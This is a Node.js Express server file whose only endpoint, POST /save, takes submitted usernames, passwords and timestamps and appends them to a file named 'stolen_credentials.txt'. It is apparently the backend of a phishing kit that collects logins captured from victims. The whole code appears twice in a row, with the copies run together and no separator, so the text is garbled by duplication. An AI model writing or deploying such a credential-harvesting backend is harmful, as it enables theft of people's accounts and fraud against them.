const express = require('express');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

app.post('/save', (req, res) => {
    const { username, password, timestamp } = req.body;
    const log = `${timestamp} | Username: ${username} | Password: ${password}\n`;
    
    fs.appendFile('stolen_credentials.txt', log, (err) => {
        if (err) console.error('Error writing file:', err);
    });
    
    res.send('OK');
});

app.listen(port, () => {
    console.log(`Backend running on port ${port}`);
});const express = require('express');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

app.post('/save', (req, res) => {
    const { username, password, timestamp } = req.body;
    const log = `${timestamp} | Username: ${username} | Password: ${password}\n`;
    
    fs.appendFile('stolen_credentials.txt', log, (err) => {
        if (err) console.error('Error writing file:', err);
    });
    
    res.send('OK');
});

app.listen(port, () => {
    console.log(`Backend running on port ${port}`);
});
